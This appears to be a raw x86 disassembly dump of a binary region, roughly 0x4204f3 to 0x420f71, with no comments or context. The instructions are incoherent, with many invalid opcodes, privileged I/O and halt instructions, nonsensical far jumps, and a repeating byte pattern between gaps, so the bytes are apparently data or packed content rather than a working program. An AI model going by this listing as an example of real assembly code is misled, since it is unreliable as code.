  4204f3:	add    BYTE PTR [esi+0x7f125794],ch
  4204f9:	shr    edi,cl
  4204fb:	mov    esp,0x5a7f6c39
  420500:	sbb    ch,BYTE PTR ds:0x57ec953a
  420506:	add    DWORD PTR [eax],eax
  420508:	add    al,0x1
  42050a:	add    BYTE PTR [eax],al
  42050c:	pusha  
  42050d:	fs je  0x4204f5
  420510:	lds    esi,FWORD PTR [ebx]
  420512:	repz add BYTE PTR [ecx+esi*2-0x79],ah
  420517:	out    0xb7,eax
  420519:	jg     0x420525
  42051b:	in     al,0xcb
  42051d:	xor    al,0xaa
  42051f:	push   0x7c2e05b8
  420524:	or     eax,ebp
  420526:	jns    0x4204ae
  420528:	jle    0x420501
  42052a:	popf   
  42052b:	inc    ecx
  42052c:	(bad)  
  42052d:	loop   0x420525
  42052f:	call   0x4544:0x66b2ef17
  420536:	xchg   al,ah
  420538:	push   eax
  420539:	paddq  mm0,QWORD PTR [esi+0xf]
  42053d:	push   ds
  42053e:	arpl   WORD PTR [ebp-0x2ee68209],ax
  420544:	sbb    eax,0x7b876573
  420549:	or     al,0x72
  42054b:	sbb    edi,esp
  42054d:	mov    ds:0x88a8fbc6,al
  420552:	dec    edx
  420553:	push   ebx
  420554:	shl    BYTE PTR [esi-0xa961775],1
  42055a:	jg     0x4205bc
  42055c:	shl    bh,0xf5
  42055f:	inc    eax
  420560:	pop    ebp
  420561:	mov    dh,BYTE PTR [ebp-0x7a9fc8f0]
  420567:	fld    DWORD PTR [eax-0x47]
  42056a:	rol    DWORD PTR [ecx+0x738b3a06],cl
  420570:	push   0xb407a1ca
  420575:	imul   ebx,ebp,0x2f
  420578:	mov    ecx,0x828f0802
  42057d:	jno    0x42056f
  42057f:	sub    ch,cl
  420581:	pusha  
  420582:	cmp    DWORD PTR [edi+0x65],0xffffff80
  420586:	or     al,0xbc
  420588:	cli    
  420589:	sub    BYTE PTR [ebp+0x6d],dh
  42058c:	aas    
  42058d:	aam    0xbc
  42058f:	shl    DWORD PTR [ebx],0x49
  420592:	add    esp,DWORD PTR [eax-0xa4877e8]
  420598:	fisubr DWORD PTR ds:0xaf4de244
  42059e:	add    cl,bl
  4205a0:	sub    ecx,ebp
  4205a2:	hlt    
  4205a3:	lahf   
  4205a4:	sbb    BYTE PTR [ebx],dl
  4205a6:	xlat   BYTE PTR ds:[ebx]
  4205a7:	es sub al,0x8b
  4205aa:	push   ebx
  4205ab:	fwait
  4205ac:	push   esp
  4205ad:	dec    edi
  4205ae:	and    eax,0x5aaa652f
  4205b3:	add    ecx,DWORD PTR [ebx+0x65]
  4205b6:	and    bl,BYTE PTR [ebx]
  4205b8:	ret    
  4205b9:	mov    eax,ds:0x53d980ce
  4205be:	gs call 0x8bbf6aad
  4205c4:	les    ecx,FWORD PTR [edx+0x49]
  4205c7:	lods   al,BYTE PTR ds:[esi]
  4205c8:	iret   
  4205c9:	(bad)  
  4205ca:	mov    dh,0xa2
  4205cc:	ja     0x4205ec
  4205ce:	stc    
  4205cf:	jl     0x42059f
  4205d1:	dec    edx
  4205d2:	and    ax,0x47c3
  4205d6:	jmp    0x420637
  4205d8:	dec    eax
  4205d9:	test   al,0xde
  4205db:	shr    BYTE PTR [esi+0x3c5541e2],1
  4205e1:	cli    
  4205e2:	pop    edi
  4205e3:	push   0xc477fa9f
  4205e8:	arpl   bp,di
  4205ea:	xor    DWORD PTR [ebx+0x6aea716d],0x897495a2
  4205f4:	xor    al,0x66
  4205f6:	sub    cl,BYTE PTR [edx-0x23a9db19]
  4205fc:	inc    edx
  4205fd:	mov    ecx,0x13129120
  420602:	aad    0xea
  420604:	retf   0x9d82
  420607:	xchg   edx,eax
  420608:	dec    edi
  420609:	and    esi,DWORD PTR [ebx]
  42060b:	ret    0xdd57
  42060e:	mov    ah,0x91
	...
  420674:	test   BYTE PTR [eax-0x48],ch
  420677:	or     ah,bh
  420679:	fdiv   DWORD PTR [esp+ebp*8+0x78d500c5]
  420680:	sub    DWORD PTR [eax-0x5a],edi
  420683:	cmp    al,dh
  420685:	pop    eax
  420686:	add    DWORD PTR [eax],eax
  420688:	add    al,0x1
  42068a:	add    BYTE PTR [eax],al
  42068c:	pop    edi
  42068d:	icebp  
  42068e:	aas    
  42068f:	iret   
  420690:	icebp  
  420691:	rcl    BYTE PTR [esi+eax*8-0x294d19b3],0x7c
  420699:	pop    ds
  42069a:	iret   
  42069b:	gs push cx
  42069e:	mov    edi,0x9910888b
  4206a3:	inc    edx
  4206a4:	mov    dh,0x10
  4206a6:	xor    BYTE PTR [esi-0x1b],bl
  4206a9:	mov    cl,0xea
  4206ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206ac:	inc    eax
  4206ad:	cmp    dl,BYTE PTR [edi+ecx*2]
  4206b0:	sub    DWORD PTR [ecx-0x45ad07fc],esp
  4206b6:	xchg   edi,eax
  4206b7:	aam    0x94
  4206b9:	in     al,0x49
  4206bb:	jno    0x420646
  4206bd:	jecxz  0x42066d
  4206bf:	inc    ebp
  4206c0:	and    dh,dl
  4206c2:	dec    edi
  4206c3:	sub    DWORD PTR [ecx],ebx
  4206c5:	push   eax
  4206c6:	and    ah,cl
  4206c8:	daa    
  4206c9:	fwait
  4206ca:	inc    edx
  4206cb:	or     al,0x9e
  4206cd:	cmp    BYTE PTR fs:[esi],cl
  4206d0:	add    eax,0x48f438dd
  4206d5:	jmpw   0x28ac
  4206d9:	test   al,0x2b
  4206db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206dc:	or     BYTE PTR [ecx+0x5d],al
  4206df:	adc    eax,0x322b4e8e
  4206e4:	jmp    0xb2ab:0x906e85c9
  4206eb:	enter  0x9575,0x55
  4206ef:	or     bl,BYTE PTR [edx-0x193c4a09]
  4206f5:	or     DWORD PTR [edx+0x14],esp
  4206f8:	test   esp,0x941e4d04
  4206fe:	xchg   ebp,eax
  4206ff:	addr16 (bad) 
  420701:	adc    eax,0x7de89dfb
  420706:	sbb    BYTE PTR [ebp+0x6aa93b62],bh
  42070c:	xor    DWORD PTR [edi-0x13],ecx
  42070f:	mov    cl,0x43
  420711:	loop   0x4206dc
  420713:	jg     0x4206f6
  420715:	enter  0x566a,0x6f
  420719:	sti    
  42071a:	loop   0x42072a
  42071c:	mov    bl,0xb
  42071e:	stc    
  42071f:	mov    ebx,0x71c7343f
  420724:	xor    ecx,DWORD PTR [esi+edx*2+0x0]
  420728:	sub    esp,DWORD PTR [edx+0x5c59770]
  42072e:	jae    0x4206c7
  420730:	add    DWORD PTR [ebx-0x48],edi
  420733:	xchg   ebp,eax
  420734:	sbb    BYTE PTR [edi-0x63],bl
  420737:	mov    ch,0x2d
  420739:	stc    
  42073a:	sahf   
  42073b:	imul   edx,esi,0xa4749a9
  420741:	popf   
  420742:	xlat   BYTE PTR ds:[ebx]
  420743:	jp     0x4206cc
  420745:	test   DWORD PTR [esp+edx*8-0x7b],ecx
  420749:	out    dx,eax
  42074a:	push   0x11
  42074c:	push   ebx
  42074d:	xchg   ecx,eax
  42074e:	push   eax
  42074f:	inc    edi
  420750:	xor    ebx,DWORD PTR [edi+0x27]
  420753:	jns    0x4206d8
  420755:	dec    ebp
  420756:	xchg   edx,eax
  420757:	adc    BYTE PTR [edx],al
  420759:	pop    ss
  42075a:	xchg   BYTE PTR [edi-0x3],ah
  42075d:	popf   
  42075e:	call   0x58222332
  420763:	sub    ecx,DWORD PTR [ebp-0x32]
  420766:	jmp    0xd864:0xb610044f
  42076d:	xchg   edx,eax
  42076e:	sbb    ebp,DWORD PTR [ebp-0x16]
  420771:	(bad)  
  420772:	sub    BYTE PTR [esi-0x61691ecf],ch
  420778:	push   esp
  420779:	push   0xb2805ac0
  42077e:	cmp    ebx,esp
  420780:	mov    ebx,0xb461b1ba
  420785:	pop    edi
  420786:	fmul   DWORD PTR [eax+0x38]
  420789:	push   eax
  42078a:	das    
  42078b:	sub    BYTE PTR [edi+0x215216],ah
	...
  4207f1:	add    BYTE PTR [eax],al
  4207f3:	add    BYTE PTR [ecx-0x587fdad1],cl
  4207f9:	mov    ch,BYTE PTR [ebp-0x2390c6d1]
  4207ff:	pusha  
  420800:	pop    esi
  420801:	das    
  420802:	stos   BYTE PTR es:[edi],al
  420803:	loope  0x4207f9
  420805:	pop    ecx
  420806:	add    DWORD PTR [eax],eax
  420808:	add    al,0x1
  42080a:	add    BYTE PTR [eax],al
  42080c:	mov    esi,0xb594b7ab
  420811:	pop    esi
  420812:	sub    dh,BYTE PTR [ecx+0x1b]
  420815:	and    eax,0xcb8c266
  42081a:	mov    edx,0x6ceba41c
  42081f:	and    edx,DWORD PTR [ecx+edi*8]
  420822:	das    
  420823:	(bad)  
  420824:	xor    ecx,DWORD PTR [ecx-0x76]
  420827:	scas   eax,DWORD PTR es:[edi]
  420828:	icebp  
  420829:	mov    ch,0xc9
  42082b:	push   edx
  42082c:	rcr    BYTE PTR [edx+0xe9511d],cl
  420832:	xor    bh,0x81
  420835:	ret    0x9b8a
  420838:	lock sbb eax,0x697f5d2e
  42083e:	or     edi,DWORD PTR [ebx-0x4c]
  420841:	cmp    ah,BYTE PTR [eax+ebp*2+0x29]
  420845:	lock adc eax,0x29ab5ada
  42084b:	pop    eax
  42084c:	mov    cs,WORD PTR [eax+0x66]
  42084f:	nop
  420850:	inc    ebp
  420851:	std    
  420852:	in     eax,dx
  420853:	(bad)  
  420854:	repnz cmp ebx,eax
  420857:	and    al,0x62
  420859:	ds dec ecx
  42085b:	xor    BYTE PTR [esi+edx*1+0x33],ch
  42085f:	lock jp 0x42082d
  420862:	inc    esp
  420863:	pop    ss
  420864:	enter  0xfc2f,0x41
  420868:	push   ebx
  420869:	jne    0x4208a9
  42086b:	pop    edi
  42086c:	out    dx,al
  42086d:	jno    0x420860
  42086f:	je     0x4208ca
  420871:	push   ebx
  420872:	mov    BYTE PTR [esi+ebp*2],0xa5
  420876:	scas   al,BYTE PTR es:[edi]
  420877:	loop   0x420873
  420879:	(bad)  
  42087b:	test   eax,0x815f96e
  420880:	push   eax
  420881:	lahf   
  420882:	add    DWORD PTR [esi],edi
  420884:	outs   dx,BYTE PTR ds:[esi]
  420885:	sub    ebp,DWORD PTR [edx-0x2a]
  420888:	popa   
  420889:	fcomp  QWORD PTR [ecx]
  42088b:	nop
  42088c:	mov    dh,0xe9
  42088e:	data16 fwait
  420890:	push   esp
  420891:	sub    eax,0x9ac9cda
  420896:	bound  ecx,QWORD PTR [ebx-0x32]
  420899:	sbb    BYTE PTR [ebx-0x57],dl
  42089c:	xor    DWORD PTR [edx-0x2b1dbbd9],ebp
  4208a2:	retf   0xa59c
  4208a5:	js     0x42084b
  4208a7:	inc    esp
  4208a8:	shl    dh,1
  4208aa:	mov    bl,0x81
  4208ac:	jl     0x4208b0
  4208ae:	sub    BYTE PTR [ebx+0x70],ch
  4208b1:	mov    eax,0xd7dc7ad7
  4208b6:	dec    ebx
  4208b7:	in     al,dx
  4208b8:	push   ss
  4208b9:	rol    WORD PTR [ecx+0x56],0x5a
  4208be:	dec    ecx
  4208bf:	xchg   ebp,esi
  4208c1:	jo     0x42090b
  4208c3:	hlt    
  4208c4:	push   0xffffffa3
  4208c6:	aad    0xe3
  4208c8:	cmp    esp,esp
  4208ca:	inc    eax
  4208cb:	and    dl,bl
  4208cd:	inc    ebp
  4208ce:	arpl   WORD PTR [ecx+edx*2-0x6283c9da],dx
  4208d5:	out    dx,al
  4208d6:	dec    edx
  4208d7:	neg    DWORD PTR [ebx+0x17ac5a39]
  4208dd:	and    eax,0xece895fb
  4208e2:	ret    0xd568
  4208e5:	sbb    BYTE PTR [eax],0xed
  4208e8:	mov    esp,DWORD PTR [ecx]
  4208ea:	pop    ebp
  4208eb:	xchg   esi,eax
  4208ec:	pushf  
  4208ed:	jp     0x420941
  4208ef:	imul   eax,DWORD PTR [esi],0x653d7519
  4208f5:	pop    esi
  4208f6:	lock jl 0x4208b9
  4208f9:	fcomp  QWORD PTR [ecx-0x6d]
  4208fc:	(bad)  
  4208fd:	frstor [ecx-0x4f39a627]
  420903:	hlt    
  420904:	ds pop esi
  420906:	inc    ebp
  420907:	les    esi,FWORD PTR [eax]
  420909:	jg     0x42092d
  42090b:	push   eax
  42090c:	sub    esi,DWORD PTR [edx]
  42090e:	mov    cl,0xfd
	...
  420974:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0x44
  420981:	sub    DWORD PTR [edx],ebp
  420983:	popf   
  420984:	clc    
  420985:	pop    edx
  420986:	add    DWORD PTR [eax],eax
  420988:	add    al,0x1
  42098a:	add    BYTE PTR [eax],al
  42098c:	and    bl,BYTE PTR [edx+0x3c51a4c6]
  420992:	adc    BYTE PTR [ecx+0x35ffa467],cl
  420998:	loop   0x420936
  42099a:	mov    bh,0x4
  42099c:	ds aaa 
  42099e:	xor    al,0xe9
  4209a0:	in     al,0xda
  4209a2:	dec    esi
  4209a3:	(bad)  
  4209a4:	cmp    esi,eax
  4209a6:	pop    es
  4209a7:	icebp  
  4209a8:	push   esi
  4209a9:	ror    al,1
  4209ab:	pop    ds
  4209ac:	dec    eax
  4209ad:	xor    edx,DWORD PTR [ecx]
  4209af:	es test eax,0xd5437f6f
  4209b5:	mov    ah,0x9d
  4209b7:	ror    BYTE PTR [eax+edi*1+0x3a],cl
  4209bb:	mov    bh,0xe6
  4209bd:	inc    ecx
  4209be:	push   esp
  4209bf:	sti    
  4209c0:	sbb    dl,bh
  4209c2:	add    bl,ah
  4209c4:	jmp    0x38cb4da2
  4209c9:	mov    al,ds:0xf31d209f
  4209ce:	dec    edi
  4209cf:	dec    edx
  4209d0:	ficomp WORD PTR [esi]
  4209d2:	push   cs
  4209d3:	daa    
  4209d4:	xor    BYTE PTR [ebp-0x70d934a7],bh
  4209da:	data16 mov dh,0x8d
  4209dd:	sahf   
  4209de:	push   ecx
  4209df:	jecxz  0x4209ec
  4209e1:	add    DWORD PTR [ebp-0x3d],ecx
  4209e4:	adc    al,0x24
  4209e6:	nop
  4209e7:	(bad)  
  4209e8:	cs (bad) 
  4209ea:	pop    ebp
  4209eb:	xor    DWORD PTR [ebp-0x1d],esp
  4209ee:	sub    dh,bh
  4209f0:	(bad)
  4209f3:	jp     0x4209fc
  4209f5:	dec    eax
  4209f6:	aam    0x43
  4209f8:	dec    esi
  4209f9:	je     0x420a1d
  4209fb:	lahf   
  4209fc:	cwde   
  4209fd:	add    esp,esp
  4209ff:	outs   dx,BYTE PTR ds:[esi]
  420a00:	sub    DWORD PTR [eax+0x11753afa],edx
  420a06:	hlt    
  420a07:	fdiv   DWORD PTR [ecx]
  420a09:	out    0x51,eax
  420a0b:	cmp    BYTE PTR ds:0xb985d82b,cl
  420a11:	sbb    eax,0xf1ffe136
  420a16:	sar    cl,1
  420a18:	test   DWORD PTR [ebx+ebx*1-0x34],edx
  420a1c:	adc    eax,0xea913175
  420a21:	mov    edx,0xe2ffd329
  420a26:	cmp    eax,0x3d1e506b
  420a2b:	mov    es,WORD PTR [edi-0x7f]
  420a2e:	push   edx
  420a2f:	xchg   edi,eax
  420a30:	jecxz  0x4209c2
  420a32:	xchg   edx,eax
  420a33:	gs cdq 
  420a35:	test   eax,0xa1a9e126
  420a3a:	(bad)  
  420a3c:	aam    0xba
  420a3e:	daa    
  420a3f:	adc    eax,0xdc0f3a41
  420a44:	hlt    
  420a45:	sub    bl,BYTE PTR [edi+0x6b42bfad]
  420a4b:	gs push ecx
  420a4d:	dec    ebx
  420a4e:	lods   al,BYTE PTR ds:[esi]
  420a4f:	push   ss
  420a50:	cwde   
  420a51:	jmp    0x420a3a
  420a53:	mov    edx,0x21fcded7
  420a58:	lds    ebp,FWORD PTR [ebp-0x152df917]
  420a5e:	add    al,0xaf
  420a60:	jmp    0xa35f802e
  420a65:	mov    dh,0xa1
  420a67:	inc    eax
  420a68:	mov    al,dh
  420a6a:	inc    ebp
  420a6b:	mov    cl,BYTE PTR [eax+0x775990d5]
  420a71:	mov    ds:0xee01d5b9,eax
  420a76:	inc    edi
  420a77:	sub    BYTE PTR [ecx+esi*2-0x33],0x8b
  420a7c:	xchg   ebp,eax
  420a7d:	add    DWORD PTR [ecx-0x5f],ebp
  420a80:	sub    ah,dl
  420a82:	loop   0x420ae6
  420a84:	and    eax,ecx
  420a86:	cmp    al,0xeb
  420a88:	dec    esi
  420a89:	loopne 0x420ac5
  420a8b:	or     DWORD PTR [ecx-0xa],esi
  420a8e:	dec    BYTE PTR [edx+0x0]
	...
  420af1:	add    BYTE PTR [eax],al
  420af3:	add    bh,bl
  420af5:	xor    ch,BYTE PTR [edi-0x6010ed]
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	loopne 0x420b72
  420b02:	in     al,0x19
  420b04:	cld    
  420b05:	pop    ebx
  420b06:	add    DWORD PTR [eax],eax
  420b08:	add    al,0x1
  420b0a:	add    BYTE PTR [eax],al
  420b0c:	jns    0x420ab1
  420b0e:	mov    edi,0xf815c47f
  420b13:	sahf   
  420b14:	enter  0x5f88,0xe8
  420b18:	imul   ebx,DWORD PTR [ebp-0x26],0x51
  420b1c:	aaa    
  420b1d:	clc    
  420b1e:	stos   BYTE PTR es:[edi],al
  420b1f:	ror    DWORD PTR [ebp+0x27],cl
  420b22:	test   DWORD PTR [ecx-0x7f],ebp
  420b25:	xlat   BYTE PTR ds:[ebx]
  420b26:	sbb    ah,BYTE PTR [edi-0x5e]
  420b29:	mov    bh,0x41
  420b2b:	sub    DWORD PTR [esi],0xc0338c31
  420b31:	imul   ebx,ebp,0x28e5bad
  420b37:	iret   
  420b38:	add    DWORD PTR [eax-0x14406e29],edi
  420b3e:	ds fsubr st(0),st
  420b41:	popa   
  420b42:	inc    eax
  420b43:	add    eax,0x1f59b9c6
  420b48:	inc    esp
  420b49:	sbb    al,0x30
  420b4b:	jbe    0x420ba4
  420b4d:	mov    esi,esp
  420b4f:	jne    0x420b9f
  420b51:	std    
  420b52:	mov    BYTE PTR [ecx-0x6b4eabbc],ch
  420b58:	add    BYTE PTR [edi-0x48],dh
  420b5b:	gs dec ecx
  420b5d:	daa    
  420b5e:	jg     0x420aea
  420b60:	pop    ss
  420b61:	or     dh,dl
  420b63:	imul   ebx,DWORD PTR [edi-0x39],0x64d65d86
  420b6a:	pop    ebx
  420b6b:	push   0xffffffe0
  420b6d:	and    ebx,DWORD PTR [edx+0x545741fb]
  420b73:	call   0x35b6:0x8d8c61bb
  420b7a:	retf   0x9b1e
  420b7d:	jns    0x420b94
  420b7f:	adc    eax,DWORD PTR [edi]
  420b81:	pop    ss
  420b82:	lods   al,BYTE PTR ds:[esi]
  420b83:	ins    DWORD PTR es:[edi],dx
  420b84:	push   esp
  420b85:	or     DWORD PTR [eax],0x3b
  420b88:	cwde   
  420b89:	cmc    
  420b8a:	fsubr  QWORD PTR [ecx]
  420b8c:	inc    esi
  420b8d:	pop    ebx
  420b8e:	sbb    ebp,DWORD PTR [eax]
  420b90:	stc    
  420b91:	int    0x57
  420b93:	jmp    0xf929d121
  420b98:	sub    al,0x9c
  420b9a:	jb     0x420b1e
  420b9c:	inc    ecx
  420b9d:	rcr    BYTE PTR [eax+0x1efc1659],0x2f
  420ba4:	icebp  
  420ba5:	stos   DWORD PTR es:[edi],eax
  420ba6:	sahf   
  420ba7:	(bad)
  420baa:	mov    cl,0xbe
  420bac:	cmp    ebx,DWORD PTR [ebx-0x14]
  420baf:	js     0x420c2f
  420bb1:	cmp    BYTE PTR [ecx-0x78098e29],0x46
  420bb8:	sbb    esp,DWORD PTR [ecx-0x4bea253e]
  420bbe:	je     0x420b72
  420bc0:	xchg   esi,eax
  420bc1:	sub    al,0x21
  420bc3:	cmp    edi,edi
  420bc5:	outs   dx,DWORD PTR ds:[esi]
  420bc6:	or     eax,0xc4247ff5
  420bcb:	mov    eax,ds:0x761bbc03
  420bd0:	repz or dl,BYTE PTR [edi-0x3319c7a0]
  420bd7:	jmp    0x420b6e
  420bd9:	mov    bl,0x5
  420bdb:	repz inc eax
  420bdd:	je     0x420b72
  420bdf:	mov    eax,0x6127c405
  420be4:	sti    
  420be5:	les    ecx,FWORD PTR ds:0xb997e625
  420beb:	ror    ebp,1
  420bed:	les    esi,FWORD PTR [eax]
  420bef:	cmp    ebp,DWORD PTR [ebx]
  420bf1:	(bad)  
  420bf2:	aas    
  420bf3:	aaa    
  420bf4:	mov    edx,gs
  420bf6:	fbld   TBYTE PTR [eax-0x7f]
  420bf9:	jge    0x420bad
  420bfb:	jl     0x420c1a
  420bfd:	std    
  420bfe:	or     ebx,DWORD PTR [esi+ebx*2-0x4ac7d723]
  420c05:	clc    
  420c06:	ja     0x420c4c
  420c08:	in     al,dx
  420c09:	or     eax,0x9bb127f
  420c0e:	or     ebp,esp
	...
  420c74:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420c7a:	mov    edx,0x1886e3f
  420c7f:	in     eax,0x13
  420c81:	adc    dh,dh
  420c83:	call   0x104:0x15d00
  420c8a:	add    BYTE PTR [eax],al
  420c8c:	mov    bh,0x9f
  420c8e:	push   0xbe9933f9
  420c93:	retf   0xe4e0
  420c96:	aaa    
  420c97:	gs test edx,ebp
  420c9a:	dec    ebp
  420c9b:	inc    DWORD PTR [ebp-0x41]
  420c9e:	xchg   ebp,eax
  420c9f:	ins    BYTE PTR es:[edi],dx
  420ca0:	arpl   WORD PTR [edx-0x4e],sp
  420ca3:	sbb    DWORD PTR [ebx+eiz*1+0x42],edx
  420ca7:	adc    esi,DWORD PTR [ebx-0x14c2ea25]
  420cad:	mov    ds:0xdcbca02a,al
  420cb2:	pop    es
  420cb3:	inc    esp
  420cb4:	aad    0x99
  420cb6:	clc    
  420cb7:	xlat   BYTE PTR ds:[ebx]
  420cb8:	stc    
  420cb9:	push   edi
  420cba:	adc    al,0x77
  420cbc:	mov    dl,0xcc
  420cbe:	adc    al,0x18
  420cc0:	ds add eax,0x7ba8f68
  420cc6:	xchg   esp,eax
  420cc7:	scas   eax,DWORD PTR es:[edi]
  420cc8:	retf   
  420cc9:	bound  ebp,QWORD PTR [esp+edx*8-0x20a3ee6c]
  420cd0:	mov    esp,0x4cf27243
  420cd5:	retf   0x14d0
  420cd8:	js     0x420ca3
  420cda:	jle    0x420d19
  420cdc:	stos   DWORD PTR es:[edi],eax
  420cdd:	in     al,dx
  420cde:	mov    bh,0x65
  420ce0:	add    eax,0xa8be50fa
  420ce5:	sub    BYTE PTR [edx+0x8],ah
  420ce8:	jae    0x420ca0
  420cea:	ror    DWORD PTR [eax-0x44260aa],0xba
  420cf1:	inc    ebp
  420cf2:	jns    0x420d4b
  420cf4:	add    DWORD PTR [eax+0x50d44380],0xffffffda
  420cfb:	fs and al,0x44
  420cfe:	dec    edx
  420cff:	lahf   
  420d00:	dec    esp
  420d01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d02:	(bad)  
  420d03:	jmp    0x420d4e
  420d05:	bound  ebx,QWORD PTR [ebx+eax*1+0x4ef1054e]
  420d0c:	xor    DWORD PTR [ebp+0x40197a91],0x2e1543c
  420d16:	or     DWORD PTR [esi-0x6e],edx
  420d19:	(bad)  
  420d1a:	lds    ebx,FWORD PTR [esp+edx*1]
  420d1d:	mov    ecx,0x1b78dfcb
  420d22:	and    BYTE PTR [edi+0x6d],ah
  420d25:	add    al,BYTE PTR ds:0xe1bf287a
  420d2b:	pushf  
  420d2c:	outs   dx,BYTE PTR ds:[esi]
  420d2d:	mov    dl,BYTE PTR [ebx]
  420d2f:	cmc    
  420d30:	mov    bh,0x9c
  420d32:	aas    
  420d33:	cdq    
  420d34:	cmovg  ebp,DWORD PTR [esi-0x59]
  420d38:	in     eax,dx
  420d39:	mov    al,0x1f
  420d3b:	jnp    0x420ce7
  420d3d:	aas    
  420d3e:	int3   
  420d3f:	aas    
  420d40:	mov    esp,0xe68c6647
  420d45:	lds    ebp,FWORD PTR [edx+0xf7ef72e]
  420d4b:	je     0x420d7c
  420d4d:	cld    
  420d4e:	jns    0x420d27
  420d50:	jmp    0x7808:0xe728fcf2
  420d57:	jbe    0x420dcc
  420d59:	mov    bh,0xa5
  420d5b:	xchg   edi,eax
  420d5c:	popf   
  420d5d:	lods   al,BYTE PTR ds:[esi]
  420d5e:	cmp    esp,DWORD PTR [ebx-0x15802f28]
  420d64:	lods   eax,DWORD PTR fs:[si]
  420d67:	pop    ebx
  420d68:	and    eax,DWORD PTR [esi]
  420d6a:	ja     0x420d7b
  420d6c:	fistp  QWORD PTR [ebx+0x1e]
  420d6f:	les    edi,FWORD PTR [edx+0x29]
  420d72:	div    DWORD PTR [ebp+0x13]
  420d75:	mul    BYTE PTR [edi+0x3a]
  420d78:	lods   al,BYTE PTR ds:[esi]
  420d79:	cmc    
  420d7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d7b:	test   BYTE PTR [ebp-0x26],dl
  420d7e:	push   ds
  420d7f:	or     al,ah
  420d81:	push   es
  420d82:	int    0xbe
  420d84:	dec    ecx
  420d85:	cdq    
  420d86:	jg     0x420d1a
  420d88:	ds ret 
  420d8a:	js     0x420d4e
  420d8c:	xchg   ebp,eax
  420d8d:	push   cs
  420d8e:	xlat   BYTE PTR ds:[ebx]
  420d8f:	inc    esp
	...
  420df4:	out    0x1e,eax
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0xfb1e48a5
  420e04:	add    al,0x5e
  420e06:	add    DWORD PTR [eax],eax
  420e08:	add    al,0x1
  420e0a:	add    BYTE PTR [eax],al
  420e0c:	call   0x7ccb5081
  420e11:	inc    ebx
  420e12:	test   eax,0x8a34951d
  420e17:	pop    esi
  420e18:	repz mov ebp,0x898fcea
  420e1e:	aam    0xe4
  420e20:	sbb    al,0xfa
  420e22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e23:	inc    edx
  420e24:	in     eax,dx
  420e25:	mov    ecx,0xcd33a73e
  420e2a:	hlt    
  420e2b:	lock inc esi
  420e2d:	inc    esi
  420e2e:	fnstcw WORD PTR [edi+0x78ea3fe3]
  420e34:	mov    eax,0x4a707b80
  420e39:	test   DWORD PTR [eax],eax
  420e3b:	xchg   ecx,eax
  420e3c:	sbb    dh,al
  420e3e:	dec    ecx
  420e3f:	mov    ax,0x312e
  420e43:	(bad)  
  420e44:	ficomp DWORD PTR [edx-0x79]
  420e47:	gs out dx,eax
  420e49:	mov    esi,0x9b5f8f77
  420e4e:	in     al,0x83
  420e50:	ret    
  420e51:	cld    
  420e52:	ficomp WORD PTR [eax]
  420e54:	je     0x420de8
  420e56:	in     al,0xba
  420e58:	jb     0x420eba
  420e5a:	xlat   BYTE PTR ds:[ebx]
  420e5b:	daa    
  420e5c:	pop    ecx
  420e5d:	imul   DWORD PTR [esi+0x5a45204a]
  420e63:	pushf  
  420e64:	jl     0x420e8a
  420e66:	inc    DWORD PTR [ecx]
  420e68:	inc    ecx
  420e69:	pop    ds
  420e6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e6b:	mov    ds:0xeaafd9d6,al
  420e70:	cld    
  420e71:	div    BYTE PTR es:[eax-0x4b]
  420e75:	mov    ah,BYTE PTR [ebp-0x4603b1ab]
  420e7b:	xor    cl,al
  420e7d:	jle    0x420e8e
  420e7f:	push   0x62
  420e81:	push   esp
  420e82:	(bad)  
  420e83:	retf   
  420e84:	pop    ebp
  420e85:	rol    DWORD PTR [esp+esi*2+0x76],1
  420e89:	lds    esp,FWORD PTR [ebp+0x53b25922]
  420e8f:	cs cld 
  420e91:	inc    edx
  420e92:	jb     0x420f00
  420e94:	ror    ah,1
  420e96:	daa    
  420e97:	mov    ah,0x89
  420e99:	or     eax,0xc4aa020c
  420e9e:	test   al,0xdc
  420ea0:	push   edx
  420ea1:	and    al,bh
  420ea3:	sbb    al,0x3e
  420ea5:	in     eax,dx
  420ea6:	imul   edx,DWORD PTR gs:[esi+0x74bdbd95],0xc05134c3
  420eb1:	push   0xaf3525ad
  420eb6:	cmp    ebp,ecx
  420eb8:	xor    al,0xf9
  420eba:	xchg   bh,cl
  420ebc:	fwait
  420ebd:	adc    ecx,edi
  420ebf:	fstp   TBYTE PTR [ebp-0x37c3e1d6]
  420ec5:	jg     0x420eec
  420ec7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ec8:	add    BYTE PTR [eax-0x5f],0x1
  420ecc:	loop   0x420e86
  420ece:	sar    ecx,0x4c
  420ed1:	sub    eax,0x394f85b5
  420ed6:	int3   
  420ed7:	mov    ebp,0x7f49d1c6
  420edc:	(bad)
  420edf:	imul   ebp,DWORD PTR [eax-0x70],0x6cd7d8a5
  420ee6:	xor    BYTE PTR [ecx],0x90
  420ee9:	imul   esp,DWORD PTR [edi+0x47431cf9],0x1c
  420ef0:	and    al,0x8d
  420ef2:	inc    edx
  420ef3:	test   al,0xea
  420ef5:	ins    BYTE PTR es:[edi],dx
  420ef6:	sub    al,0xeb
  420ef8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ef9:	sub    BYTE PTR [ecx],cl
  420efb:	mov    eax,0x234d8d20
  420f00:	jbe    0x420e94
  420f02:	jns    0x420ea6
  420f04:	add    edi,DWORD PTR [ebx]
  420f06:	xlat   BYTE PTR ds:[ebx]
  420f07:	add    DWORD PTR [edi+0x60],esp
  420f0a:	ret    
  420f0b:	xchg   esi,edi
  420f0d:	js     0x420f71
  420f0f:	cmp    BYTE PTR [eax],al
	...
  420f71:	add    BYTE PTR [eax],al
